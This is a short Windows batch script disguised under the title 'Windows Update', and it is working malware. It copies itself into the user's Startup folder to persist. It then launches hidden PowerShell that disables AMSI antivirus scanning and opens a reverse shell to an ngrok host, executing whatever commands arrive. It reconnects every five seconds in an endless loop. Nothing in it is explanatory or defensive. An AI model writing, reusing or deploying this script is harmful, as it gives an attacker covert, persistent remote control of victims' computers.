@echo off
title Windows Update


set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "persist=WindowsUpdate.bat"

:: Se copie tout seul dans le dossier démarrage (une seule fois)
if not exist "%startup%\%persist%" (
    copy /y "%~f0" "%startup%\%persist%" >nul 2>&1
)


:loop
powershell -NoP -NonI -W Hidden -Exec Bypass -C "$z='System.Management.Automation.AmsiUtils';[Ref].Assembly.GetType($z).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$client=New-Object System.Net.Sockets.TCPClient('4.tcp.eu.ngrok.io',24967);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
timeout /t 5 /nobreak >nul
goto loop
